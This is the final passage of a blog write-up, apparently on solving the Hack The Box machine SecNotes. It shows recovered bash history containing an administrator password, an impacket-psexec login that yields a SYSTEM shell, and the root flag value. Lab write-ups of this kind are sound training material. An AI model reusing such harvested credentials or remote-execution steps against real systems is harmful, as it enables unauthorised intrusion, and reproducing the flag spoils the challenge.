~/.bash_aliases ]; then<br>    . ~/.bash_aliases<br>fi<br><br><span class="hljs-meta"># enable programmable completion features (you don<span class="hljs-string">&#x27;t need to enable</span></span><br><span class="hljs-string"><span class="hljs-meta"># this, if it&#x27;</span>s already enabled in /etc/bash.bashrc and /etc/profile</span><br><span class="hljs-meta"># sources /etc/bash.bashrc).</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> [ -f /etc/bash_completion ] &amp;&amp; ! shopt -oq posix; then</span><br>#    . /etc/bash_completion<br><span class="hljs-meta">#fi</span><br><br>cd ~<br>cd /mnt/c/<br>ls<br>cd Users/<br>cd /<br>cd ~<br>ls<br>pwd<br>mkdir filesystem<br>mount <span class="hljs-comment">//127.0.0.1/c$ filesystem/</span><br>sudo apt install cifs-utils<br>mount <span class="hljs-comment">//127.0.0.1/c$ filesystem/</span><br>mount <span class="hljs-comment">//127.0.0.1/c$ filesystem/ -o user=administrator</span><br>cat /proc/filesystems<br>sudo modprobe cifs<br>smbclient<br>apt install smbclient<br>smbclient<br>smbclient -U <span class="hljs-string">&#x27;administrator%u6!4ZwgwOM#^OBf#Nwnh&#x27;</span> \\\\<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>\\c$<br>&gt; .bash_history <br>less .bash_history<br><span class="hljs-built_in">exit</span><br># ~/.profile: executed by Bourne-compatible login shells.<br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;$BASH&quot;</span> ]; then<br>  <span class="hljs-keyword">if</span> [ -f ~/.bashrc ]; then<br>    . ~/.bashrc<br>  fi<br>fi<br><br>mesg n || <span class="hljs-literal">true</span><br>PS C:\Distros\Ubuntu&gt; <br></code></pre></td></tr></table></figure>
+
+<p>22、发现账号密码信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">smbclient -U <span class="hljs-string">&#x27;administrator%u6!4ZwgwOM#^OBf#Nwnh&#x27;</span> \\\\<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>\\c$<br></code></pre></td></tr></table></figure>
+
+<p>23、尝试进行登录</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ impacket-psexec administrator@<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.97</span>                         <br>Impacket v0<span class="hljs-number">.11</span><span class="hljs-number">.0</span> - Copyright <span class="hljs-number">2023</span> Fortra<br><br>Password:<br> <br>[*] Requesting shares on <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.97</span>.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file SkEcBGeu.exe<br>[*] Opening SVCManager on <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.97</span>.....<br>[*] Creating service WacH on <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.97</span>.....<br>[*] Starting service WacH.....<br>[!] Press help <span class="hljs-keyword">for</span> extra shell commands<br>Microsoft Windows [Version <span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.228</span>]<br>(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.<br><br>C:\WINDOWS\system32&gt; <br>C:\WINDOWS\system32&gt; whoami<br>nt authority\system<br></code></pre></td></tr></table></figure>
+
+<p>24、获取最终的flag信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">C:\WINDOWS\system32&gt; type C:/Users/administrator/Desktop/root.txt<br>The syntax of the command is incorrect.<br><br>C:\WINDOWS\system32&gt; cd C:/Users/administrator/Desktop/<br> <br>C:\Users\Administrator\Desktop&gt; dir<br> Volume in drive C has no label.<br> Volume Serial Number is <span class="hljs-number">1E7</span>B<span class="hljs-number">-9B</span>76<br><br> Directory of C:\Users\Administrator\Desktop<br><br><span class="hljs-number">01</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">03</span>:<span class="hljs-number">39</span> AM    &lt;DIR&gt;          .<br><span class="hljs-number">01</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">03</span>:<span class="hljs-number">39</span> AM    &lt;DIR&gt;          ..<br><span class="hljs-number">06</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">04</span>:<span class="hljs-number">45</span> PM             <span class="hljs-number">1</span>,<span class="hljs-number">417</span> Microsoft Edge.lnk<br><span class="hljs-number">03</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2024</span>  <span class="hljs-number">08</span>:<span class="hljs-number">12</span> AM                <span class="hljs-number">34</span> root.txt<br>               <span class="hljs-number">2</span> File(s)          <span class="hljs-number">1</span>,<span class="hljs-number">451</span> bytes<br>               <span class="hljs-number">2</span> Dir(s)  <span class="hljs-number">13</span>,<span class="hljs-number">629</span>,<span class="hljs-number">911</span>,<span class="hljs-number">040</span> bytes <span class="hljs-built_in">free</span><br><br>C:\Users\Administrator\Desktop&gt; cat root.txt<br><span class="hljs-string">&#x27;cat&#x27;</span> is not recognized as an internal or external command,<br>operable program or batch file.<br><br>C:\Users\Administrator\Desktop&gt; type root.txt<br><span class="hljs-number">7b</span>7f28ba00b4d215ac6ae213d4bbf581<br><br>C:\Users\Administrator\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/151</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SecNotes-htb-writeup</div>
+      <div>https://sh1yan.top/2024/03/29/SecNotes-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年3月29日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/03/30/Worker-htb-writeup/" title="Worker-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Worker-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/03/28/Chatterbox-htb-writeup/" title="Chatterbox-htb-writeup">
+                        <span class="hidden-mobile">Chatterbox-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
